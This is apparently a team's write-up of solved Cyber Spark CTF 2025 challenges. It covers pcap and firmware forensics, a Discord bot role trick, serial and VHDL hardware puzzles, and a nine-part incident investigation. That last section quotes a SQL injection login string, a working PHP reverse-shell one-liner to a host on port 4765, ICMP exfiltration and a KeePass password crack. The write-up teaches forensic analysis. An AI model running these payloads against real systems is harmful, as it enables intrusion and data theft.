## 🚁 Cyber Spark CTF 2025 – Challenge Writeups

These are a few writeups I remember and found fun at **CyberSpark**, where my team **chmoula** proudly took **first place** 🏆!

### 🥇 1st Place

---

### 🔐 Signal for Sale

Upon analyzing the provided `traffic.pcapng` file in **Wireshark**, we spot a suspicious email-based conversation that hints at a covert transaction. One party requests a sample of the "product", and shortly after, a file named `dump.zip` is transferred.

**Steps:**

1. Export `dump.zip` from the capture (via HTTP or other relevant protocol).
2. Extract the archive and examine its contents: two `.debian` files.
3. The files are identified as:

   ```
   SMTP mail, Unicode text, UTF-8 text, with very long lines
   ```
4. One of the `.debian` files contains a **Base64-encoded image**.
5. Decode and save it as an image file (e.g., `.jpg`).
6. Calculate the **MD5 hash** of the image to retrieve the flag.

📦 **Flag**: `Spark{<MD5 of the decoded image>}`

This image becomes the lead-in for the next challenge.

---

### 🧐 Trail of Code

From the image found earlier, we observe a **camera** with a visible model label:
🔍 `SPR-KWBXCM-25`

1. Searching the model name on GitHub reveals:
   [github.com/BenMoussa25/SPR-KWBXCM-25](https://github.com/BenMoussa25/SPR-KWBXCM-25)

2. Download `firmware.bin` from the repository.

3. Run `binwalk firmware.bin` to analyze its contents:

   ```
   SquashFS filesystem, zImage, LZ4 data, certificates, and POSIX tar
   ```

4. Extract the filesystem:

   ```bash
   binwalk -e firmware.bin
   ```

5. Navigate to the extracted files and locate:

   ```
   app_settings.json
   ```

6. The **last line** of the config file contains the second flag.

🎯 **Flag**: `Spark{F1rmW4R3_B4S1C5_H1dd3n_S3Cr3t5}`

---

### 💬 DiscordBadyyyyy

In this challenge, we encounter a Discord bot that responds to the command `!flag`, but only if the user has the role **"hacker"**.

Attempts to assign the role directly within the original server were unsuccessful.

Instead, a creative workaround was used:

1. Extract the **bot ID** from the original server.
2. Add the bot to a **personal Discord server**.
3. Assign the **"hacker"** role manually to the user.
4. Execute the `!flag` command again.

This time, it responds with the flag.

🔑 **Flag**: `Spark{G00d_j0B_H4cker}`

---

### 🔹 Hardware: Logic

A physical device was emitting noise on **pins 3, 5, and 7**. Using a **logic analyzer**, signal traces were captured simultaneously on these three channels.

The challenge was to **identify the correct baud rate** for each channel in order to decode the serial data.

Once the correct baud rates were found, decoding the captured signals revealed the flag.

---

### ⛓️ Hardware: Chain

A `.sal` capture file was provided. It contained a serial signal that, once decoded with the right **baud rate**, revealed a link to a `task.vhdl` file.

This VHDL file defines a multiplexer `Mux_16vers1` which selects 8-bit slices from a 128-bit `Flag_bin` input, depending on the value of `Sel`.

It also contains a hint:

```vhdl
-- Hello hacker I run this code with those select values 
-- [0000,1110,1111,1101,1100,0011,0010,0100,0101,0110,0111,1001,1011,1010,1000,0001]
-- And i get this output
-- H&__V_L!wTf4trUD
```

By mapping each output character to the corresponding segment of `Flag_bin`, the original 128-bit flag can be reconstructed in the correct order:

| Sel  | Bits       | Position | Char |
| ---- | ---------- | -------- | ---- |
| 1000 | 127 .. 120 | 0        | U    |
| 1001 | 119 .. 112 | 1        | 4    |
| 1010 | 111 .. 104 | 2        | r    |
| 1011 | 103 .. 96  | 3        | t    |
| 1111 | 95 .. 88   | 4        | \_   |
| 1110 | 87 .. 80   | 5        | &    |
| 1101 | 79 .. 72   | 6        | \_   |
| 1100 | 71 .. 64   | 7        | V    |
| 0000 | 63 .. 56   | 8        | H    |
| 0001 | 55 .. 48   | 9        | D    |
| 0010 | 47 .. 40   | 10       | L    |
| 0011 | 39 .. 32   | 11       | \_   |
| 0111 | 31 .. 24   | 12       | f    |
| 0110 | 23 .. 16   | 13       | T    |
| 0101 | 15 .. 8    | 14       | w    |
| 0100 | 7 .. 0     | 15       | !    |

Reading the flag from MSB to LSB:

**Flag**: `Spark{U4rt_&_VHDL_fTw!}`

---

### 🏢 SecureCorp (9-Part Forensics Challenge)

#### 🧾 Part 1: First Registered Credentials

By filtering **POST requests** in Wireshark and searching for "register", we find:

```
username=cyberspark-user&password=superrandompwd
```

✅ **Flag**: `Spark{cyberspark-user_superrandompwd}`

#### 🌐 Part 2: Attacker IP Address

Using the previous packet, we identify the source IP:
✅ **Flag**: `Spark{192.168.111.128}`

#### 🔎 Part 3: Scanning Tool

Lots of noisy requests to various routes suggest usage of a directory scanner. The User-Agent or pattern confirms:
✅ **Flag**: `Spark{gobuster}`

#### 🔓 Part 4: Web Vulnerability

POST to login reveals:

```
password=' OR 1=1 --
```

✅ **Flag**: `Spark{SQLi}`

#### 💥 Part 5: Failed Reverse Shells and Port

Filtering requests to `/admin_panel` reveals multiple reverse shell attempts. 7 of them fail, and one succeeds on port **4765**.
✅ **Flag**: `Spark{7_4765}`

#### 🐚 Part 6: Working Reverse Shell SHA256

Decode the payload:

```
php -r '$sock=fsockopen("192.168.111.128",4765);shell_exec("bash <&3 >&3 2>&3");'
```

Calculate its SHA256.
✅ **Flag**: `Spark{<sha256_of_payload>}`

#### 📡 Part 7: Data Exfiltration Protocol

Payloads in ICMP packets indicate data smuggling using that protocol.
✅ **Flag**: `Spark{icmp}`

#### 🔐 Part 8: File Decryption

Extracted all ICMP payloads with `tshark`, decoded from hex to base64, then XORed with key:

```
SUPER_DUPER__SECRET_k3y_so_I_dont_f0rg33t
```

Recovered file: `vault.bin`, SHA256 gives the flag.
✅ **Flag**: `Spark{<sha256_of_vault>}`

#### 🧠 Part 9: Vault Analysis

The `vault.bin` was a **KeePass 1.x** database. Using `keepass2john` + `john`, password `1234567890` was recovered.

Credentials gave access to **Pastebin** and **Codeforces**. Final hint on Codeforces led to a **failed submission** containing the last flag.


---
